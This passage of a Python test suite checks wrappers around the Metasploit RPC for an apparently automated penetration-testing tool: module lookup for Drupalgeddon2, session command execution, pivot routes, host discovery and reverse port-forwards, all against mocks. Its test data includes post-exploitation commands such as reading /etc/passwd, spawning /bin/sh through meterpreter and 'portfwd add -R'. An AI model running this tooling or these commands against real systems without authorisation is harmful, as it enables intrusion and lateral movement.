            "description": "This module exploits a Drupal property injection in the Forms API.",
            "references": [["CVE", "2018-7600"], ["URL", "https://www.drupal.org/sa-core-2018-002"]],
            "default_target": 0,
            "targets": {"0": "Automatic (PHP In-Memory)", "3": "Automatic (Linux Dropper)"},
            "options": {
                "RHOSTS": {"type": "rhosts", "required": True, "desc": "The target host(s)"},
                "RPORT": {"type": "port", "required": True, "default": 80, "desc": "The target port"},
                "TARGETURI": {"type": "string", "required": True, "default": "/", "desc": "Path to Drupal install"},
                "SSL": {"type": "bool", "required": False, "default": False, "desc": "Negotiate SSL/TLS"},
                "PHP_FUNC": {"type": "string", "required": True, "default": "passthru", "desc": "PHP function to execute"},
                "HTTP::pad_get_params": {"type": "bool", "required": False, "desc": "Evasion padding"},
            }
        }
        msf = make_msf_mock(module_info_result=mock_info)

        with patch("core.rpc_client._msf_client_instance", msf):
            from core.coder_tools import msf_get_module_info
            with patch("core.coder_tools.msf_client", msf):
                result = json.loads(msf_get_module_info("exploit/unix/webapp/drupal_drupalgeddon2"))

        assert result["status"] == "ok"
        assert result["name"] == "Drupal Drupalgeddon 2 Forms API Property Injection"
        assert result["rank"] == "excellent"
        assert "CVE-2018-7600" in result["references"]
        assert "TARGETURI" in result["required_options"]
        assert result["required_options"]["TARGETURI"]["default"] == "/"
        assert "SSL" in result["available_options"]
        # Internal noise should be filtered
        assert "HTTP::pad_get_params" not in result["available_options"]
        assert "HTTP::pad_get_params" not in result["required_options"]

    def test_rpc_error_handling(self):
        """When Metasploit RPC returns an error or module not found, returns status: error."""
        msf = make_msf_mock(module_info_result={"error": "Module not found"})

        with patch("core.rpc_client._msf_client_instance", msf):
            from core.coder_tools import msf_get_module_info
            with patch("core.coder_tools.msf_client", msf):
                result = json.loads(msf_get_module_info("exploit/unknown/fake_module"))

        assert result["status"] == "error"
        assert "Failed to retrieve module info" in result["message"]


# ---------------------------------------------------------------------------
# 5. msf_search_modules
# ---------------------------------------------------------------------------

class TestMsfSearchModules:

    def test_empty_keyword_returns_error(self):
        """Keywords shorter than 2 characters are rejected immediately."""
        from core.tools import msf_search_modules
        for bad_kw in ["", " ", "a"]:
            result = json.loads(msf_search_modules(bad_kw))
            assert result["status"] == "error"

    def test_cve_search_uses_cve_string(self):
        """CVE keywords are extracted and searched directly via module.search."""
        cve_results = [
            {"fullname": "exploit/unix/webapp/drupal_drupalgeddon2"},
            {"fullname": "exploit/multi/http/drupal_cve_2019_6340_unserialize"},
        ]
        msf = make_msf_mock(module_search_result=cve_results)
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_search_modules("CVE-2018-7600"))

        assert result["status"] == "success"
        assert result["count"] == 2
        # CVE search must have been called with the lowercase cve string
        calls = [str(c) for c in msf.call.call_args_list]
        assert any("cve-2018-7600" in c.lower() for c in calls)

    def test_keyword_search_returns_results(self):
        """Single keyword search returns matching modules."""
        kw_results = [
            {"fullname": "exploit/unix/ftp/vsftpd_234_backdoor"},
            {"fullname": "auxiliary/scanner/ftp/ftp_version"},
        ]
        msf = make_msf_mock(module_search_result=kw_results)
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_search_modules("vsftpd"))

        assert result["status"] == "success"
        assert result["count"] == 2

    def test_results_capped_at_20(self):
        """Search results are capped at 20 entries."""
        many_results = [{"fullname": f"exploit/fake/module_{i}"} for i in range(30)]
        msf = make_msf_mock(module_search_result=many_results)
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_search_modules("fake"))

        assert result["count"] == 30  # count = total found
        assert len(result["results"]) <= 20  # returned list capped

    def test_local_fallback_single_keyword(self):
        """When RPC search returns nothing, local module list fallback is used."""
        msf = make_msf_mock(
            module_search_result=[],  # RPC returns nothing
            module_exploits_result={"modules": [
                "unix/ftp/vsftpd_234_backdoor",
                "multi/handler",
                "windows/smb/ms17_010_eternalblue",
            ]},
            module_auxiliary_result={"modules": [
                "scanner/ftp/ftp_version",
                "scanner/portscan/tcp",
            ]}
        )
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_search_modules("vsftpd"))

        assert result["status"] == "success"
        assert any("vsftpd" in r for r in result["results"])

    # ------------------------------------------------------------------
    # BUG REGRESSION — TODO #1: multi-keyword search returns 0 results
    # ------------------------------------------------------------------
    def test_multiword_query_falls_back_to_local_and_finds_results(self):
        """
        REGRESSION — TODO #1:
        'msf_search_modules(\"portscan tcp\")' should return results.

        The RPC call to module.search("portscan tcp") will return nothing
        (MSF does not support multi-token AND search). The code must fall back
        to the local module list and match entries containing BOTH words.
        """
        msf = make_msf_mock(
            module_search_result=[],  # RPC cannot AND-match multi-word
            module_auxiliary_result={"modules": [
                "scanner/portscan/tcp",
                "scanner/portscan/udp",
                "scanner/http/http_version",
            ]},
            module_exploits_result={"modules": []}
        )
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_search_modules("portscan tcp"))

        assert result["status"] == "success", (
            "BUG #1: multi-word search returned no results — "
            "fallback local AND-filter is not working"
        )
        assert result["count"] > 0, "Expected at least one result for 'portscan tcp'"
        assert any("portscan" in r and "tcp" in r for r in result["results"])


# ---------------------------------------------------------------------------
# 6. get_network_interfaces
# ---------------------------------------------------------------------------

class TestGetNetworkInterfaces:

    def test_happy_path_with_ip_json(self):
        """get_network_interfaces parses `ip -j addr` output correctly."""
        import json as _json
        fake_ip_json = _json.dumps([
            {"ifname": "eth0", "addr_info": [{"family": "inet", "local": "192.168.1.5"}]},
            {"ifname": "lo",   "addr_info": [{"family": "inet", "local": "127.0.0.1"}]},
        ])
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = fake_ip_json

        mock_sock = MagicMock()
        mock_sock.getsockname.return_value = ("192.168.1.5", 0)

        from core.tools import get_network_interfaces
        with patch("subprocess.run", return_value=mock_result):
            with patch("socket.socket", return_value=mock_sock):
                result = json.loads(get_network_interfaces())

        assert result["status"] == "success"
        assert "eth0" in result["local_interfaces"]
        assert "192.168.1.5" in result["local_interfaces"]["eth0"]
        assert result["active_outbound_ip"] == "192.168.1.5"

    def test_socket_error_still_returns_data(self):
        """If the outbound socket check fails, the function still returns interface data."""
        import json as _json
        fake_ip_json = _json.dumps([
            {"ifname": "eth0", "addr_info": [{"family": "inet", "local": "10.0.0.1"}]},
        ])
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = fake_ip_json

        mock_sock = MagicMock()
        mock_sock.connect.side_effect = OSError("Network unreachable")
        mock_sock.getsockname.return_value = ("0.0.0.0", 0)

        from core.tools import get_network_interfaces
        with patch("subprocess.run", return_value=mock_result):
            with patch("socket.socket", return_value=mock_sock):
                result = json.loads(get_network_interfaces())

        # Should still return success with interface data
        assert result["status"] == "success"


# ---------------------------------------------------------------------------
# 7. get_lhost_for_target
# ---------------------------------------------------------------------------

class TestGetLhostForTarget:

    def test_routing_resolution(self):
        """When socket routing succeeds, lhost is derived from routing table."""
        mock_sock = MagicMock()
        mock_sock.getsockname.return_value = ("172.17.0.1", 0)

        from core.tools import get_lhost_for_target
        with patch("socket.socket", return_value=mock_sock):
            result = json.loads(get_lhost_for_target("172.17.0.4"))

        assert result["status"] == "success"
        assert result["lhost"] == "172.17.0.1"
        assert result["source"] == "routing"

    def test_fallback_when_socket_fails(self):
        """When socket routing fails, ATTACKER_LHOST fallback is used."""
        mock_sock = MagicMock()
        mock_sock.connect.side_effect = OSError("Network unreachable")

        from core.tools import get_lhost_for_target
        with patch("socket.socket", return_value=mock_sock):
            result = json.loads(get_lhost_for_target("10.99.99.99"))

        assert result["status"] == "success"
        assert result["source"] == "fallback"
        # The fallback IP comes from config.ATTACKER_LHOST
        assert result["lhost"] != ""

    def test_loopback_triggers_fallback(self):
        """If resolved IP is 127.0.0.1, the fallback config IP is used instead."""
        mock_sock = MagicMock()
        mock_sock.getsockname.return_value = ("127.0.0.1", 0)

        from core.tools import get_lhost_for_target
        with patch("socket.socket", return_value=mock_sock):
            result = json.loads(get_lhost_for_target("192.168.1.10"))

        assert result["source"] == "fallback"

    def test_includes_lport(self):
        """The result always includes the configured LPORT."""
        mock_sock = MagicMock()
        mock_sock.getsockname.return_value = ("10.10.10.1", 0)

        from core.tools import get_lhost_for_target
        with patch("socket.socket", return_value=mock_sock):
            result = json.loads(get_lhost_for_target("10.10.10.5"))

        assert "lport" in result
        assert result["lport"] != ""


# ---------------------------------------------------------------------------
# 8. msf_session_command
# ---------------------------------------------------------------------------

class TestMsfSessionCommand:

    def _sessions(self, session_type="shell"):
        return {
            "1": {
                "type": session_type,
                "tunnel_local": "127.0.0.1:4444",
                "tunnel_peer": "192.168.1.10:43210"
            }
        }

    @patch("time.sleep")
    def test_shell_session_write_and_read(self, mock_sleep):
        """Shell sessions use shell_write + shell_read."""
        calls = []
        def _call_side_effect(method, *args, **kwargs):
            calls.append((method, args))
            if method == "session.list":
                return self._sessions("shell")
            if method == "session.shell_read":
                # Find token in shell_write call if present
                for m, a in calls:
                    if m == "session.shell_write":
                        written = a[1]
                        if "END_" in written:
                            token = [line for line in written.splitlines() if "END_" in line][0].split()[-1]
                            return {"data": f"root\n{token}\n"}
                return {"data": "session_is_alive"}
            return {"result": "success"}

        msf = MagicMock()
        msf.is_connected = True
        msf.call.side_effect = _call_side_effect

        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_session_command(1, "whoami"))

        assert result["status"] == "success"
        assert result["output"] == "root"
        assert result["session_type"] == "shell"

    @patch("time.sleep")
    def test_meterpreter_native_command_uses_run_single(self, mock_sleep):
        """Native meterpreter commands (e.g. sysinfo) use meterpreter_run_single."""
        msf = make_msf_mock(
            session_list_result=self._sessions("meterpreter"),
            session_meterpreter_read_result={"data": "Computer: TARGET\nOS: Linux\n"}
        )
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_session_command(1, "sysinfo"))

        assert result["status"] == "success"
        assert result["session_type"] == "meterpreter"
        # meterpreter_run_single must have been called (not shell_write)
        calls = [c[0][0] for c in msf.call.call_args_list]
        assert "session.meterpreter_run_single" in calls
        assert "session.shell_write" not in calls

    @patch("time.sleep")
    def test_meterpreter_system_command_uses_execute(self, mock_sleep):
        """Non-native commands (e.g. 'uname -a') are routed through /bin/sh execute."""
        msf = make_msf_mock(
            session_list_result=self._sessions("meterpreter"),
            session_meterpreter_read_result={"data": "Linux target 5.15.0\n"}
        )
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_session_command(1, "uname -a"))

        assert result["status"] == "success"
        # The execute call should include -f /bin/sh
        calls_args = [str(c) for c in msf.call.call_args_list]
        assert any("/bin/sh" in c for c in calls_args)

    @patch("time.sleep")
    def test_php_meterpreter_system_command_success(self, mock_sleep):
        """
        Verifies that executing a system command on a PHP meterpreter session
        correctly writes the command using meterpreter_write and reads the command
        output using meterpreter_read.
        """
        msf = make_msf_mock(
            session_list_result=self._sessions("meterpreter"),
            session_meterpreter_read_result={"data": "uid=33(www-data)\n"}
        )
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_session_command(1, "id"))

        assert result["status"] == "success"
        assert result["output"] == "uid=33(www-data)\nuid=33(www-data)"
        
        # Verify RPC calls
        calls = [c[0][0] for c in msf.call.call_args_list]
        assert "session.meterpreter_run_single" in calls
        assert "session.meterpreter_read" in calls
        
        # Verify the exact execute command
        run_single_calls = [c[0][2] for c in msf.call.call_args_list if c[0][0] == "session.meterpreter_run_single"]
        assert any("execute -f /bin/sh" in cmd for cmd in run_single_calls)
        assert any("-H" in cmd for cmd in run_single_calls)
        assert any("(id) > /tmp/msf_exec_" in cmd for cmd in run_single_calls)
        assert any("cat /tmp/msf_exec_" in cmd for cmd in run_single_calls)

    @patch("time.sleep")
    def test_invalid_session_id_returns_error(self, mock_sleep):
        """Non-existent session_id returns an error with the list of active sessions."""
        msf = make_msf_mock(
            session_list_result=self._sessions("shell")
        )
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_session_command(99, "id"))

        assert result["status"] == "error"
        assert "99" in result["message"] or "not found" in result["message"].lower()

    @patch("time.sleep")
    def test_string_session_id_works(self, mock_sleep):
        """Session IDs passed as strings are treated equivalently to integers."""
        msf = make_msf_mock(
            session_list_result=self._sessions("shell"),
            session_shell_read_result={"data": "uid=0(root)\n"}
        )
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_session_command("1", "id"))

        assert result["status"] == "success"

    @patch("time.sleep")
    def test_meterpreter_command_with_shell_operators_uses_execute(self, mock_sleep):
        """Commands starting with native keywords but containing shell operators are routed to execute."""
        msf = make_msf_mock(
            session_list_result=self._sessions("meterpreter"),
            session_meterpreter_read_result={"data": "root\n"}
        )
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_session_command(1, "cat /etc/passwd 2>&1 | head -20"))

        assert result["status"] == "success"
        # The execute call should include -f /bin/sh
        calls_args = [str(c) for c in msf.call.call_args_list]
        assert any("/bin/sh" in c for c in calls_args)

    @patch("time.sleep")
    def test_meterpreter_cleanup_on_failure(self, mock_sleep):
        """Verifies that temp file cleanup still occurs even if reading from it fails."""
        calls_count = 0
        def custom_call(method, *args):
            nonlocal calls_count
            if method == "session.list":
                return self._sessions("meterpreter")
            if method == "session.meterpreter_read":
                calls_count += 1
                if calls_count > 7:  # Alive check (2) + flush calls (5) succeed, read output fails
                    raise Exception("Mocked read error")
                return {"data": "active"}
            return {"result": "success"}

        msf = MagicMock()
        msf.call.side_effect = custom_call

        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                result = json.loads(tools.msf_session_command(1, "uname -a"))

        assert result["status"] == "error"
        assert "Mocked read error" in result["message"]
        
        # Verify that rm is still called
        run_single_calls = [c[0][2] for c in msf.call.call_args_list if c[0][0] == "session.meterpreter_run_single"]
        assert any(cmd.startswith("rm /tmp/msf_exec_") for cmd in run_single_calls)

    @patch("time.sleep")
    def test_meterpreter_read_buffer_is_flushed(self, mock_sleep):
        """Verifies that the session buffer is flushed before running a command."""
        msf = make_msf_mock(
            session_list_result=self._sessions("meterpreter"),
            session_meterpreter_read_result={"data": ""}  # Empty so flush loop exits on first try
        )
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                with patch("core.tools._verify_session_alive", return_value=True):
                    result = json.loads(tools.msf_session_command(1, "sysinfo"))

        assert result["status"] == "success"
        
        # Verify that session.meterpreter_read was called before session.meterpreter_run_single
        calls = [c[0][0] for c in msf.call.call_args_list]
        first_read_idx = calls.index("session.meterpreter_read")
        first_run_single_idx = calls.index("session.meterpreter_run_single")
        assert first_read_idx < first_run_single_idx


# ---------------------------------------------------------------------------
# 9. msf_add_route
# ---------------------------------------------------------------------------

class TestMsfAddRoute:

    def test_happy_path_success(self):
        """Successful route addition returns status:success with route info."""
        calls_count = 0
        def custom_call(method, *args):
            nonlocal calls_count
            if method == "session.list":
                if calls_count == 0:
                    calls_count += 1
                    return {}
                return {"1": {"routes": "10.10.0.0/255.255.255.0"}}
            elif method == "module.execute":
                return {"job_id": 42}
            return {}

        msf = MagicMock()
        msf.is_connected = True
        msf.call.side_effect = custom_call

        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                with patch("core.tools._verify_session_alive", return_value=True):
                    result = json.loads(tools.msf_add_route("1", "10.10.0.0", "255.255.255.0"))

        assert result["status"] == "success"
        assert "10.10.0.0" in result["route"]
        assert "255.255.255.0" in result["route"]

    def test_failed_route_returns_error(self):
        """RPC failure in routing.add returns error with MSF response detail."""
        msf = MagicMock()
        msf.is_connected = True
        msf.call.side_effect = lambda method, *args: {"error": "Invalid session"} if method == "module.execute" else {}
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                with patch("core.tools._verify_session_alive", return_value=True):
                    result = json.loads(tools.msf_add_route("99", "10.10.0.0", "255.255.255.0"))

        assert result["status"] == "error"

    def test_rpc_exception_caught(self):
        """Exceptions from the RPC layer are caught and returned as error."""
        msf = MagicMock()
        msf.is_connected = True
        msf.call.side_effect = Exception("Connection reset")
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                with patch("core.tools._verify_session_alive", return_value=True):
                    result = json.loads(tools.msf_add_route("1", "10.10.0.0", "255.255.255.0"))

        assert result["status"] == "error"
        assert "Connection reset" in result["message"]


# ---------------------------------------------------------------------------
# 10. verify_session_alive
# ---------------------------------------------------------------------------

class TestVerifySessionAlive:

    def _sessions(self, session_type="shell"):
        return {
            "1": {
                "type": session_type,
                "tunnel_local": "127.0.0.1:4444",
                "tunnel_peer": "192.168.1.10:43210"
            }
        }

    @patch("time.sleep")
    def test_verify_session_alive_meterpreter_success(self, mock_sleep):
        msf = make_msf_mock(
            session_list_result=self._sessions("meterpreter"),
            session_meterpreter_read_result={"data": "uid=0(root)"}
        )
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                assert tools._verify_session_alive(1) is True

    @patch("time.sleep")
    def test_verify_session_alive_meterpreter_failure(self, mock_sleep):
        msf = make_msf_mock(
            session_list_result=self._sessions("meterpreter"),
            session_meterpreter_read_result={"data": ""}
        )
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                assert tools._verify_session_alive(1) is False

    @patch("time.sleep")
    def test_verify_session_alive_shell_success(self, mock_sleep):
        msf = make_msf_mock(
            session_list_result=self._sessions("shell"),
            session_shell_read_result={"data": "session_is_alive"}
        )
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                assert tools._verify_session_alive(1) is True

    @patch("time.sleep")
    def test_verify_session_alive_shell_failure(self, mock_sleep):
        msf = make_msf_mock(
            session_list_result=self._sessions("shell"),
            session_shell_read_result={"data": ""}
        )
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                assert tools._verify_session_alive(1) is False

    @patch("time.sleep")
    def test_verify_session_alive_not_in_list(self, mock_sleep):
        msf = make_msf_mock(
            session_list_result={}
        )
        with patch("core.rpc_client._msf_client_instance", msf):
            from core import tools
            with patch.object(tools, "msf_client", msf):
                assert tools._verify_session_alive(1) is False


class TestMsfDiscoverHosts:

    @patch("time.sleep")
    def test_msf_discover_hosts_success(self, mock_sleep):
        msf = make_msf_mock()
        
        def custom_call(method, *args, **kwargs):
            if method == "console.create":
                return {"id": "10"}
            elif method == "console.write":
                return {"status": "success"}
            elif method == "console.read":
                return {
                    "busy": False,
                    "data": (
                        "[+] 172.30.0.1:22,80 - 172.30.0.1:22 - TCP OPEN\n"
                        "[+] 172.30.0.5:22,80 - 172.30.0.5:80 - TCP OPEN\n"
                        "Auxiliary module execution completed"
                    )
                }
            elif method == "console.destroy":
                return {"status": "success"}
            return {}
        msf.call.side_effect = custom_call

        with patch("core.rpc_client._msf_client_instance", msf):
            from core.postexploit_tools import msf_discover_hosts
            with patch("core.postexploit_tools.msf_client", msf):
                res = json.loads(msf_discover_hosts("172.30.0.0/24"))

        assert res["status"] == "success"
        assert res["subnet"] == "172.30.0.0/24"
        assert res["discovered_hosts"] == ["172.30.0.1", "172.30.0.5"]


# ---------------------------------------------------------------------------
# TestSetupPortfwdChain
# ---------------------------------------------------------------------------

class TestSetupPortfwdChain:
    def test_setup_portfwd_chain_success_with_meterpreter_route(self):
        from core.coder_tools import _setup_portfwd_chain_internal
        from core.knowledge_graph import AttackGraph, GraphNode, GraphEdge

        g = AttackGraph("test_pf_campaign")
        g.add_node(GraphNode(id="sub-1", type="Subnet", label="10.10.2.0/24", source="tool", properties={"cidr": "10.10.2.0/24"}))
        g.add_node(GraphNode(id="exp-1", type="ExploitStep", label="Exp 1", source="tool", properties={"session_id": 5, "session_type": "shell"}))
        g.add_node(GraphNode(id="host-1", type="Host", label="Pivot", source="tool", properties={"ip": "10.10.1.3"}))
        g.add_node(GraphNode(id="iface-1", type="Interface", label="eth1", source="tool", properties={"ip": "10.10.2.3"}))

        g.add_edge(GraphEdge(id="e1", type="PIVOTS_INTO", from_node="exp-1", to_node="sub-1", source="tool"))
        g.add_edge(GraphEdge(id="e2", type="COMPROMISES", from_node="exp-1", to_node="host-1", source="tool"))
        g.add_edge(GraphEdge(id="e3", type="HAS_INTERFACE", from_node="host-1", to_node="iface-1", source="tool"))

        fake_sessions = {
            "6": {
                "type": "meterpreter",
                "routes": "10.10.2.0/255.255.255.0",
                "session_host": "10.10.1.3",
            }
        }

        mock_msf = MagicMock()
        mock_msf.call.side_effect = lambda method, *args, **kwargs: (
            fake_sessions if method == "session.list" else {"data": "[*] Reverse TCP relay created"}
        )

        with patch("core.knowledge_graph.get_graph", return_value=g), \
             patch("core.coder_tools.msf_client", mock_msf), \
             patch("time.sleep"):
            res = _setup_portfwd_chain_internal("10.10.2.4", 4445)

        assert res is not None
        assert res["lhost"] == "10.10.2.3"
        assert res["lport"] == 4445
        assert res["session_id"] == "6"

        # Check that portfwd add -R was called
        calls = [c.args for c in mock_msf.call.call_args_list if len(c.args) > 2 and c.args[0] == "session.meterpreter_run_single"]
        assert any("portfwd add -R -l 4445 -p 4445 -L 127.0.0.1" in c[2] for c in calls)

    def test_setup_portfwd_chain_returns_none_when_no_meterpreter(self):
        from core.coder_tools import _setup_portfwd_chain_internal
        from core.knowledge_graph import AttackGraph, GraphNode, GraphEdge

        g = AttackGraph("test_pf_campaign_none")
        g.add_node(GraphNode(id="sub-1", type="Subnet", label="10.10.2.0/24", source="tool", properties={"cidr": "10.10.2.0/24"}))
        g.add_node(GraphNode(id="exp-1", type="ExploitStep", label="Exp 1", source="tool", properties={"session_id": 5, "session_type": "shell"}))
        g.add_node(GraphNode(id="host-1", type="Host", label="Pivot", source="tool", properties={"ip": "10.10.1.3"}))
        g.add_node(GraphNode(id="iface-1", type="Interface", label="eth1", source="tool", properties={"ip": "10.10.2.3"}))

        g.add_edge(GraphEdge(id="e1", type="PIVOTS_INTO", from_node="exp-1", to_node="sub-1", source="tool"))
        g.add_edge(GraphEdge(id="e2", type="COMPROMISES", from_node="exp-1", to_node="host-1", source="tool"))
        g.add_edge(GraphEdge(id="e3", type="HAS_INTERFACE", from_node="host-1", to_node="iface-1", source="tool"))

        mock_msf = MagicMock()
        mock_msf.call.return_value = {}  # No sessions

        with patch("core.knowledge_graph.get_graph", return_value=g), \
             patch("core.coder_tools.msf_client", mock_msf):
            res = _setup_portfwd_chain_internal("10.10.2.4", 4445)

        assert res is None




